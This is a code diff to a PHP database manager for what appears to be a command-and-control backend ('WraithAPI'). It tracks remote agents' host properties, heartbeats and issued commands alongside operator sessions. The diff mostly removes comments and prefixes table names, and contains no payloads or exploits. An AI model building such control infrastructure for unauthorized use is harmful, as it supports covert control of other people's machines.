@@ -175,7 +175,6 @@ class DBManager {
         // Check if the database was initialised
         if (!($this->isDatabasePostInit())) {
 
-            // Init if not
             $this->initDB();
 
             // A user should be added to allow managing the API
@@ -184,8 +183,6 @@ class DBManager {
 
         }
 
-        // Finally, read the settings from the database and save them
-        // to the SETTINGS property
         $this->dbRefreshSettings();
 
     }
@@ -219,7 +216,6 @@ class DBManager {
         // be ignored here.
         $dbIsPostInit = (bool)sizeof($statement->fetchAll());
 
-        // Return to caller
         if ($dbIsPostInit) {
 
             // DB_INIT_INDICATOR exists
@@ -237,7 +233,7 @@ class DBManager {
     // Initialise the database
     private function initDB() {
 
-        // Execute the dbInitCommands initialise the database
+        // Execute each command in dbInitCommands to initialise the database
         foreach ($this->dbInitCommands as $command) {
 
             try {
@@ -246,7 +242,6 @@ class DBManager {
 
             } catch (PDOException $e) {
 
-                // If a command fails, return false
                 return false;
 
             }
@@ -278,14 +273,13 @@ class DBManager {
         // Define a variable to hold the name of the table to be dropped
         $tableToDrop = "DB_INIT_INDICATOR";
 
-        // Bind the parameter
         $statement->bindParam(":tableName", $tableToDrop);
 
         // Drop the tables
         for ($i = 0; $i <= sizeof($tables); $i++) {
 
             $statement->execute();
-            $tableToDrop = $tables[i];
+            $tableToDrop = "WraithAPI_" . $tables[i];
 
         }
 
@@ -310,14 +304,12 @@ class DBManager {
             :issuedCommands
         )");
 
-        // Bind the parameters in the query with variables
         $statement->bindParam(":assignedID", $wraith["assignedID"]);
         $statement->bindParam(":hostProperties", $wraith["hostProperties"]);
         $statement->bindParam(":wraithProperties", $wraith["wraithProperties"]);
         $statement->bindParam(":lastHeartbeatTime", $wraith["lastHeartbeatTime"]);
         $statement->bindParam(":issuedCommands", $wraith["issuedCommands"]);
 
-        // Execute the statement to add a Wraith
         $statement->execute();
 
     }
@@ -348,7 +340,6 @@ class DBManager {
         $earliestValidHeartbeat = time()-$SETTINGS["wraithMarkOfflineDelay"];
         $statement->bindParam(":earliestValidHeartbeat", $earliestValidHeartbeat);
 
-        // Execute
         $statement->execute();
 
     }
@@ -359,7 +350,6 @@ class DBManager {
         // Get a list of wraiths from the database
         $wraiths_db = $db->query("SELECT * FROM WraithAPI_ActiveWraiths")->fetchAll();
 
-        // Create an array to store a processed list of wraiths
         $wraiths = [];
 
         foreach ($wraiths_db as $wraith) {
@@ -368,13 +358,10 @@ class DBManager {
             $wraithID = $wraith["assignedID"];
             unset($wraith["assignedID"]);
 
-            // Set the (assignedID-less) wraith array as an element of the $wraiths
-            // array
             $wraiths[$wraithID] = $wraith;
 
         }
 
-        // Return the processed wraiths array
         return $wraiths;
 
     }
@@ -418,11 +405,9 @@ class DBManager {
         $statement = $db->prepare("UPDATE WraithAPI_Settings
             SET `value` = :value WHERE `key` = :setting;");
 
-        // Bind the required parameters
         $statement->bindParam(":setting", $setting);
         $statement->bindParam(":value", $value);
 
-        // Execute
         $statement->execute();
 
     }
@@ -433,10 +418,8 @@ class DBManager {
         // Prepare statement to fetch all settings
         $statement = $this->db->prepare("SELECT * FROM WraithAPI_Settings");
 
-        // Execute the statement
         $statement->execute();
 
-        // Fetch results
         $result = $statement->fetchAll();
 
         // Format the results
@@ -447,7 +430,6 @@ class DBManager {
 
         }
 
-        // Update SETTINGS property
         $this->SETTINGS = $tmpSettings;
 
     }
@@ -560,16 +542,13 @@ class DBManager {
         $sessionToken = bin2hex(random_bytes(25));
         $lastSessionHeartbeat = time();
 
-        // Bind the parameters in the query with variables
         $statement->bindParam(":username", $username);
         $statement->bindParam(":sessionID", $sessionID);
         $statement->bindParam(":sessionToken", $sessionToken);
         $statement->bindParam(":lastSessionHeartbeat", $lastSessionHeartbeat);
 
-        // Execute the statement to add a Wraith
         $statement->execute();
 
-        // Return the ID of the created session
         return $sessionID;
 
     }
@@ -580,7 +559,6 @@ class DBManager {
         // Get a list of sessions from the database
         $sessions_db = $db->query("SELECT * FROM WraithAPI_Sessions")->fetchAll();
 
-        // Create an array to store a processed list of sessions
         $sessions = [];
 
         foreach ($sessions_db as $session) {
@@ -589,13 +567,10 @@ class DBManager {
             $sessionID = $session["sessionID"];
             unset($session["sessionID"]);
 
-            // Set the (sessionID-less) session array as an element of the $sessions
-            // array
             $sessions[$sessionID] = $session;
 
         }
 
-        // Return the processed sessions array
         return $sessions;
 
     }
@@ -607,10 +582,8 @@ class DBManager {
         $statement = $db->prepare("DELETE FROM `WraithAPI_Sessions`
             WHERE `sessionID` = :sessionID");
 
-        // Bind parameters
         $statement->bindParam(":sessionID", $sessionID);
 
-        // Execute
         $statement->execute();
 
     }
@@ -627,7 +600,6 @@ class DBManager {
         $earliestValidHeartbeat = time()-$SETTINGS["managementSessionExpiryDelay"];
         $statement->bindParam(":earliestValidHeartbeat", $earliestValidHeartbeat);
 
-        // Execute
         $statement->execute();
 
     }
@@ -639,11 +611,9 @@ class DBManager {
         $statement = $db->prepare("UPDATE WraithAPI_Sessions
             SET `lastSessionHeartbeat` = :currentTime WHERE `sessionID` = :sessionID;");
 
-        // Get the current time and the session ID and bind them to the params
         $statement->bindParam(":currentTime", time());
         $statement->bindParam(":sessionID", $sessionID);
 
-        // Execute
         $statement->execute();
 
     }
@@ -656,20 +626,16 @@ class DBManager {
         // Get a list of statistics from the database
         $stats_db = $db->query("SELECT * FROM WraithAPI_Stats")->fetchAll();
 
-        // Create an array to store a processed list of statistics
         $stats = [];
 
         foreach ($stats_db as $stat) {
 
-            // Get the stat key
             $key = $stat["key"];
 
-            // Copy the stat value to the stats array
             $stats[$key] = $stat["value"];
 
         }
 
-        // Return the processed stats array
         return $stats;
 
     }
@@ -681,11 +647,9 @@ class DBManager {
         $statement = $db->prepare("UPDATE WraithAPI_Stats
             SET `value` = :value WHERE `key` = :stat;");
 
-        // Bind the parameters
         $statement->bindParam(":stat", $stat);
         $statement->bindParam(":value", $value);
 
-        // Execute
         $statement->execute();
 
     }
